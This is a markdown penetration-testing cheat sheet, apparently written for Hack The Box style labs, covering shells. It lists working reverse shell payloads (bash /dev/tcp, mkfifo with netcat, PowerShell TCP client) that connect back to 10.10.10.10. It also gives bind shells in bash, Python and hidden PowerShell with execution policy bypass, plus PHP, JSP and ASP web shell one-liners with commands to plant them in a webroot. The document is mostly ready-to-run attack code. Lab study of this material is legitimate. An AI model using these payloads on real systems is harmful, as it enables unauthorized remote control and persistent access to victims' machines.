
# Shells

## Reverse Shell

Start a listener on your machine, then execute a payload on the target to connect back.

### Listener
```bash
nc -lvnp 1234
```

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p` | Port to listen on |

### Find your IP (HTB: use tun0)
```bash
ip a
```

### Payloads

**Bash (Linux)**
> Redirects the interactive bash session's input/output over a TCP connection to your machine.
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

> Creates a named pipe, pipes shell I/O through it via netcat. More reliable when `bash` isn't available.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

**PowerShell (Windows)**
> Opens a TCP socket to your listener, then loops — reading commands from the stream, executing them with `iex`, and sending the output back. Essentially a manual interactive shell over raw TCP.
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

---

## Bind Shell

Payload runs on target and listens. You connect to it.

### Payloads

**Bash (Linux)**
> Same named pipe trick as above but netcat listens on the target instead of connecting out.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Python**
> Creates a TCP socket, binds it to port 1234 on all interfaces, waits for a connection, then loops — receiving commands, running them as subprocesses, and sending back the output.
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**PowerShell (Windows)**
> Same loop as the reverse shell but runs a `TcpListener` on the target. Runs hidden with execution policy bypassed so it won't prompt or show a window.
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### Connect to bind shell
```bash
nc 10.10.10.1 1234
```

---

## TTY Upgrade

Run this every time you catch a raw shell — gives you a proper interactive terminal.

```bash
# 1. On the remote shell
python -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell
Ctrl+Z

# 3. On your local machine
stty raw -echo
fg
# Hit enter twice if needed

# 4. Fix terminal size — run these on your LOCAL machine first
echo $TERM          # e.g. xterm-256color
stty size           # e.g. 67 318

# 5. Back on the remote shell, apply the values
export TERM=xterm-256color
stty rows 67 columns 318
```

---

## Web Shell

Runs on the target web server. Communicates over HTTP — bypasses firewall rules and survives reboots.

### One-liners

**PHP**
> Takes the `cmd` parameter from the HTTP request and passes it directly to the system shell.
```php
<?php system($_REQUEST["cmd"]); ?>
```

**JSP**
> Uses Java's `Runtime` to execute the `cmd` parameter as an OS process.
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP**
> Evaluates the `cmd` parameter as code using ASP's built-in `eval`.
```asp
<% eval request("cmd") %>
```

### Default Webroots
| Web Server | Path |
|------------|------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `c:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

### Write shell to webroot (Linux/Apache example)
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Execute commands
```bash
# Browser
http://<target>/shell.php?cmd=id

# cURL
curl http://<target>/shell.php?cmd=id
```

---

## External References

- [InternalAllTheThings - Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
